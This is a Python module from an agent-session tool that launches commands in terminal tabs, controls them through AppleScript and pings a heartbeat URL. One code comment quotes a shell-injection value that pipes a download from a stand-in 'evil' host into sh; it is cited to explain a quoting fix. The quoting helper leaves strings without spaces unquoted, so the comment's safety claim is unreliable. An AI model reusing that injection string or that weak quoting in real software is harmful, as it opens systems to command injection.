"""Open a command in a new terminal window. Used by fork (worktree +
conversation) and snapshot restore so interactive agents land in a real
terminal you can type into.

The terminal app is chosen by:
  1. an explicit `app` argument ("iterm" | "terminal"), else
  2. the RUBBERDUCK_TERMINAL env var, else
  3. iTerm if it's installed, else macOS Terminal.
On Linux it tries the common emulators. Falls back to printing the command.
"""

import os
import platform
import shutil
import subprocess
from pathlib import Path

MAC_TERMINALS = ("iterm", "terminal")


def available_terminals() -> list[str]:
    """Terminal apps we can target on this machine (for a UI picker)."""
    system = platform.system()
    if system == "Darwin":
        out = []
        if _iterm_installed():
            out.append("iterm")
        out.append("terminal")  # always present on macOS
        return out
    if system == "Linux":
        return [t for t in ("gnome-terminal", "x-terminal-emulator", "xterm") if shutil.which(t)]
    return []


def open_in_terminal(
    cwd: str,
    argv: list[str],
    *,
    app: str | None = None,
    env: dict[str, str] | None = None,
    heartbeat: tuple[str, str] | None = None,
    title: str | None = None,
) -> bool:
    """Open a new terminal in `cwd` running `argv`. Returns True if a terminal
    was spawned, False if we could only fall back to printing the command.
    `env` is exported before the command (used to pass RUBBERDUCK_SESSION_KEY so
    the agent's hooks report under Rubberduck's session key). `heartbeat` is
    (url, session_key): the tab pings `url` every 20s while alive so Rubberduck
    can tell a killed tab from a quiet one. `title` names the tab (the user's
    session name) so you can find it among other tabs."""
    exports = "".join(f"export {k}={_q(v)}; " for k, v in (env or {}).items())
    agent = " ".join(_q(a) for a in argv)
    if heartbeat is not None:
        agent = with_heartbeat(agent, *heartbeat)
    command = f"cd {_q(cwd)} && {exports}{agent}"
    if title:
        # Set the tab title via an OSC sequence before the agent runs. (iTerm and
        # Terminal also get an explicit custom title set via AppleScript below,
        # which the agent can't override as it redraws.)
        command = f"printf '\\033]0;%s\\007' {_q(title)}; {command}"
    system = platform.system()

    # Tests (and CI) set this so launching a session never opens a real terminal
    # window — otherwise every e2e run leaves orphan tabs behind. The caller still
    # records the session row; it just has no live terminal to drive or close.
    if os.environ.get("RUBBERDUCK_NO_TERMINAL"):
        return False

    if system == "Darwin":
        choice = (app or os.environ.get("RUBBERDUCK_TERMINAL") or _default_mac()).lower()
        if choice == "iterm" and _open_iterm(command, title):
            return True
        if _open_terminal(command, title):  # Terminal.app fallback
            return True
    elif system == "Linux":
        for term in available_terminals():
            if _spawn([term, "-e", command]):
                return True

    print(f"[rubberduck] open a terminal and run:\n  {command}")
    return False


def close_terminal_by_tty(tty: str, *, app: str | None = None) -> bool:
    """Close the terminal tab whose tty matches (e.g. /dev/ttys003). The tty is
    stable and not clobbered by the agent (unlike the tab title), so this is the
    reliable way to find the tab Rubberduck launched. macOS only."""
    if platform.system() != "Darwin" or not tty:
        return False
    choice = (app or os.environ.get("RUBBERDUCK_TERMINAL") or _default_mac()).lower()
    if choice == "iterm" and _iterm_installed():
        return _spawn(["osascript", "-e", _close_iterm_by_tty(tty)])
    return _spawn(["osascript", "-e", _close_terminal_by_tty(tty)])


def focus_terminal_by_tty(tty: str, *, app: str | None = None) -> bool:
    """Bring the terminal tab whose tty matches to the front and select it, so a
    dashboard "jump to terminal" action lands you in the right tab. Matches by
    tty (stable, agent-can't-clobber), same as close. macOS only."""
    if platform.system() != "Darwin" or not tty:
        return False
    choice = (app or os.environ.get("RUBBERDUCK_TERMINAL") or _default_mac()).lower()
    if choice == "iterm" and _iterm_installed():
        return _spawn(["osascript", "-e", _focus_iterm_by_tty(tty)])
    return _spawn(["osascript", "-e", _focus_terminal_by_tty(tty)])


def answer_prompt_by_tty(tty: str, decision: str, *, app: str | None = None) -> bool:
    """Answer an agent's terminal prompt by sending a keystroke to its tab —
    'approve' sends Enter on the default (Yes) choice, 'deny' sends Escape. This
    is how Rubberduck answers a permission/yes-no prompt for a session launched
    into a real terminal tab (no PTY of our own to inject into). macOS only."""
    if platform.system() != "Darwin" or not tty or decision not in ("approve", "deny"):
        return False
    choice = (app or os.environ.get("RUBBERDUCK_TERMINAL") or _default_mac()).lower()
    if choice == "iterm" and _iterm_installed():
        return _spawn(["osascript", "-e", _answer_iterm_by_tty(tty, decision)])
    return _spawn(["osascript", "-e", _answer_terminal_by_tty(tty, decision)])


def _answer_iterm_by_tty(tty: str, decision: str) -> str:
    esc = _esc(tty)
    # iTerm writes to a specific session directly. Approve: send Enter (accept the
    # default Yes). Deny: send ESC (char 27) with no newline to cancel.
    send = (
        "write text newline YES"
        if decision == "approve"
        else "write text (ASCII character 27) newline NO"
    )
    return (
        'tell application "iTerm"\n'
        "  repeat with w in windows\n"
        "    repeat with t in tabs of w\n"
        "      repeat with s in sessions of t\n"
        f'        if (tty of s as string) is "{esc}" then\n'
        f"          tell s to {send}\n"
        "          return\n"
        "        end if\n"
        "      end repeat\n"
        "    end repeat\n"
        "  end repeat\n"
        "end tell"
    )


def _answer_terminal_by_tty(tty: str, decision: str) -> str:
    esc = _esc(tty)
    # Terminal.app has no per-tab write API, so focus the tab and synthesize the
    # key via System Events: Return accepts the default (Yes); Escape cancels.
    keystroke = "key code 36" if decision == "approve" else "key code 53"  # Return / Escape
    return (
        'tell application "Terminal"\n'
        "  repeat with w in windows\n"
        "    repeat with t in tabs of w\n"
        f'      if (tty of t as string) is "{esc}" then\n'
        "        set selected of t to true\n"
        "        set index of w to 1\n"
        "        activate\n"
        "        delay 0.15\n"
        f'        tell application "System Events" to {keystroke}\n'
        "        return\n"
        "      end if\n"
        "    end repeat\n"
        "  end repeat\n"
        "end tell"
    )


def _focus_terminal_by_tty(tty: str) -> str:
    esc = _esc(tty)
    return (
        'tell application "Terminal"\n'
        "  repeat with w in windows\n"
        "    repeat with t in tabs of w\n"
        f'      if (tty of t as string) is "{esc}" then\n'
        "        set selected of t to true\n"
        "        set index of w to 1\n"
        "        activate\n"
        "        return\n"
        "      end if\n"
        "    end repeat\n"
        "  end repeat\n"
        "end tell"
    )


def _focus_iterm_by_tty(tty: str) -> str:
    esc = _esc(tty)
    return (
        'tell application "iTerm"\n'
        "  repeat with w in windows\n"
        "    repeat with t in tabs of w\n"
        "      repeat with s in sessions of t\n"
        f'        if (tty of s as string) is "{esc}" then\n'
        "          select t\n"
        "          select s\n"
        "          tell w to select\n"
        "          activate\n"
        "          return\n"
        "        end if\n"
        "      end repeat\n"
        "    end repeat\n"
        "  end repeat\n"
        "end tell"
    )


def _close_terminal_by_tty(tty: str) -> str:
    esc = _esc(tty)
    return (
        'tell application "Terminal"\n'
        "  repeat with w in windows\n"
        "    repeat with t in tabs of w\n"
        f'      if (tty of t as string) is "{esc}" then\n'
        "        close t\n"
        "        return\n"
        "      end if\n"
        "    end repeat\n"
        "  end repeat\n"
        "end tell"
    )


def _close_iterm_by_tty(tty: str) -> str:
    esc = _esc(tty)
    return (
        'tell application "iTerm"\n'
        "  repeat with w in windows\n"
        "    repeat with t in tabs of w\n"
        "      repeat with s in sessions of t\n"
        f'        if (tty of s as string) is "{esc}" then\n'
        "          close t\n"
        "          return\n"
        "        end if\n"
        "      end repeat\n"
        "    end repeat\n"
        "  end repeat\n"
        "end tell"
    )


def with_heartbeat(agent: str, url: str, session_key: str) -> str:
    """Wrap the agent command so the tab pings `url` every 20s while alive and
    stops when the agent exits or the tab is killed. The trap kills the loop on
    EXIT; killing the tab takes the whole shell (loop included) down with it."""
    # $(tty) is the tab's device (e.g. /dev/ttys003) — stable and reported on
    # every ping so the server can find and close this exact tab on delete.
    #
    # session_key is shell-quoted into a variable rather than interpolated into
    # the JSON string: interpolating it raw allowed `x";curl evil|sh;echo "` to
    # break out of the double quotes and inject commands. The payload is then
    # assembled by concatenating single-quoted JSON fragments with the quoted
    # variable and the $(tty) expansion, so neither value can escape.
    key_var = f"__rd_key={_q(session_key)}; "
    # Read the per-install token so the heartbeat POST passes the server's auth
    # gate. Same machine/user, so the 0600 file is readable.
    token_var = '__rd_tok=$(cat "${RUBBERDUCK_HOME:-$HOME/.rubberduck}/token" 2>/dev/null); '
    ping = (
        f"{key_var}{token_var}"
        "curl -s -X POST " + _q(url) + " -H 'Content-Type: application/json' "
        '-H "X-Rubberduck-Token: $__rd_tok" '
        '-d "{\\"session_key\\":\\"$__rd_key\\",\\"tty\\":\\"$(tty)\\"}" '
        ">/dev/null 2>&1"
    )
    return (
        f"( while true; do {ping}; sleep 20; done ) & __rd_hb=$!; "
        f'trap "kill $__rd_hb 2>/dev/null" EXIT; {agent}'
    )


def _default_mac() -> str:
    return "iterm" if _iterm_installed() else "terminal"


def _iterm_installed() -> bool:
    return Path("/Applications/iTerm.app").is_dir() or shutil.which("iterm2") is not None


def _open_terminal(command: str, title: str | None = None) -> bool:
    # Open as a new TAB in the front Terminal window if one exists (Cmd-T then
    # run); otherwise `do script` makes a fresh window. Activate to bring forward.
    esc = _esc(command)
    # `custom title` sticks regardless of what the agent prints, so the tab keeps
    # the session name. `set tt` captures the tab `do script` returns.
    set_title = f'    set custom title of tt to "{_esc(title)}"\n' if title else ""
    script = (
        'tell application "Terminal"\n'
        "  activate\n"
        "  if (count of windows) > 0 then\n"
        '    tell application "System Events" to keystroke "t" using command down\n'
        "    delay 0.2\n"
        f'    set tt to do script "{esc}" in front window\n'
        "  else\n"
        f'    set tt to do script "{esc}"\n'
        "  end if\n"
        f"{set_title}"
        "end tell"
    )
    return _spawn(["osascript", "-e", script])


def _open_iterm(command: str, title: str | None = None) -> bool:
    # New TAB in the current iTerm window if one is open, else a new window.
    esc = _esc(command)
    # Setting the session name (and locking it off auto-naming) keeps the tab
    # titled with the session name even as the agent redraws.
    set_title = f'    set name to "{_esc(title)}"\n' if title else ""
    script = (
        'tell application "iTerm"\n'
        "  activate\n"
        "  if (count of windows) = 0 then\n"
        "    create window with default profile\n"
        "  else\n"
        "    tell current window to create tab with default profile\n"
        "  end if\n"
        "  tell current session of current window\n"
        f'    write text "{esc}"\n'
        f"{set_title}"
        "  end tell\n"
        "end tell"
    )
    return _spawn(["osascript", "-e", script])


def _q(s: str) -> str:
    """Shell-quote a path/arg for the `cd && cmd` string."""
    return "'" + s.replace("'", "'\\''") + "'" if (" " in s or "'" in s) else s


def _esc(s: str) -> str:
    """Escape for embedding inside an AppleScript double-quoted string."""
    return s.replace("\\", "\\\\").replace('"', '\\"')


def _spawn(argv: list[str]) -> bool:
    try:
        subprocess.Popen(argv, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except (OSError, FileNotFoundError):
        return False
